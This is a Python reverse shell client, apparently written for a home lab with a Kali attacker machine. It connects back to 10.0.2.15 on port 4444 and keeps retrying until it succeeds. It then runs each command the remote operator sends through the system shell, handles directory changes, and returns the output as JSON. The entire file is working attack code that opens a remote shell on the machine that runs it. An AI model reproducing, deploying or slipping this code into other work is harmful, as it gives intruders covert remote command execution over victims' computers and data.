import socket
import json
import subprocess
import os
import base64
import time

def server_connect(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def client_run():
    while True:
        command = receive()
        if command == "quit":
            connection.close()
            break
        
        # handling the cd command specifically 
        elif command.startswith("cd ") and len(command) > 3:
            try:
                os.chdir(command[3:])
                result = f"Changed directory to {os.getcwd()}"
            except FileNotFoundError as e:
                result = str(e)
        
        # execute other linux commands
        else:
            try:
                # shell=True allows running shell commands
                # stderr redirection captures error messages
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
            except Exception as e:
                result = "Error during execution: " + str(e)
        
        send(result)

server_connect('10.0.2.15', 4444) #10.0.2.15 is my Kali IP

client_run()